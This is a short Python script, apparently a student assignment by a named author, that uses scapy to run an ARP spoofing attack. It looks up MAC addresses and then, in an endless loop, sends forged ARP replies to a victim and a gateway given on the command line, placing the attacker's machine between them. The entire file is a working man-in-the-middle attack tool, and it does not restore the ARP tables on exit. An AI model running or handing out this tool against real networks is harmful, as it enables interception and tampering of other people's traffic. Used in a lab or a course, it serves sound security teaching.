import scapy.all as scapy
import sys
import time
from datetime import datetime

# Mandatory Author Information [cite: 16-23]
author = "Dominic Whye"
current_date = datetime.now().strftime("%d/%m/%Y")
print(f"Author: {author}")
print(f"Date: {current_date}")

def get_mac(ip):
    """
    to send an ARP request to retrieve the MAC address of target IP
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """
    send a forged ARP response to link the attackers MAC with the spoof_ip
    """
    target_mac = get_mac(target_ip)
    
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

if __name__ == "__main__":
    
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arpspoof.py <Victim_IP> <Gateway_IP>")
        sys.exit()

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    try:
        print(f"[*] Starting ARP spoofing on {victim_ip}...")
        while True:
            # this is to tell the victim that i am the gateway
            spoof(victim_ip, gateway_ip)
            # this is to tell the gateaway that i am the victim
            spoof(gateway_ip, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C. Exiting...")